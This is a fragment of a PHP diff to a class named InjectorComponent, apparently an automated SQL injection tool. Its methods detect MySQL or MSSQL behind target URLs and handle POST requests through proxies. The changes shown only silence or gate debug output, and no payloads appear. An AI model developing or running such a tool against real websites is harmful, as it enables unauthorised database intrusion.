-		//$this->d($url2,'url2 AFTER inj_test_get_head');
+        if($this->proxy_no_check){
+            
+        }else{
+            
+            $this->d($url,'url AFTER inj_test_get_head');
+            $this->d($url2,'url2 AFTER inj_test_get_head'); 
+        }   
+		
 		
 		/////////////////////////////////
 		
@@ -6697,7 +7335,16 @@ class InjectorComponent {
 			{
 				if(substr_count($file,$key)>0)
 				{
-					$this->d($url2,'URL HEAD good mysql:::'. $key);
+                    
+                     if($this->proxy_no_check){
+            
+                    } else{
+                        
+                       $this->d($url2,'URL HEAD good mysql:::'. $key);
+                    }   
+                    
+                    
+					
 					return $key;
 					//return $head;
 				}
@@ -6757,7 +7404,7 @@ class InjectorComponent {
 
 		$urls = $this->urlParseUrl($url2);
 		
-		$this->d($urls,'$urls');
+		//$this->d($urls,'$urls');
 		//exit;
 		
 		
@@ -7000,7 +7647,7 @@ class InjectorComponent {
 						$this->mssql = true;
 					}else
 					{
-						$this->d('false testing_mssql preg VOZMOJNO MYSQL');
+						//$this->d('false testing_mssql preg VOZMOJNO MYSQL');
 						$this->mssql = false;
 						//return false;
 					}
@@ -8800,7 +9447,14 @@ class InjectorComponent {
 	public function check_head($url){
 		if(stristr($url,'post::'))
 			{
-				$this->d('RABOTA S POST');
+                
+                
+                if($this->proxy_no_check){
+            
+                }else{
+                
+                    $this->d('RABOTA S POST');
+                }
 				
 				$url = str_replace('post::','',$url);
 				$tmp = explode("?",$url);
